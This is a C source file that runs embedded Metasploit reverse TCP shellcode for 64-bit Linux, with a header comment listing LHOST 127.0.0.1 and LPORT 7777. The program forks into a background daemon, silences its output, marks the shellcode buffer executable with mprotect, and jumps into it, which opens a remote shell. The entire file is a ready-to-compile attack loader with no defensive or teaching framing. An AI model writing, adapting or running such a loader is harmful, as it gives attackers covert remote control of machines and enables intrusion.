#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>

/*
 * linux/x64/shell_reverse_tcp - 74 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LHOST=127.0.0.1, LPORT=7777, 
 * ReverseConnectRetries=5, ReverseAllowProxy=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x1e\x61\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

#define EXIT_SUCCESS 0
#define EXIT_FAILURE 1

static void daemonize(void)
{
    pid_t pid, sid;

    /* already a daemon */
    if ( getppid() == 1 ) return;

    /* Fork off the parent process */
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then we can exit the parent process. */
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    /* At this point we are executing as the child process */

    /* Change the file mode mask */
    umask(0);

    /* Create a new SID for the child process */
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }

    /* Change the current working directory.  This prevents the current
       directory from being locked; hence not being able to remove it. */
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }

    /* Redirect standard files to /dev/null */
    freopen( "/dev/null", "r", stdin);
    freopen( "/dev/null", "w", stdout);
    freopen( "/dev/null", "w", stderr);
}

void main(int argc, char**argv)
{
	daemonize();
	
	void *addr = (void*)((unsigned long)buf & ((0UL - 1UL) ^ 0xfff));/*get memory page*/
	int ans = mprotect(addr, 1, PROT_READ|PROT_WRITE|PROT_EXEC);/*set page attributes*/
	if (ans)
	{
		exit(EXIT_FAILURE);
	}
	((void(*)(void))buf)();/*execute array*/
}
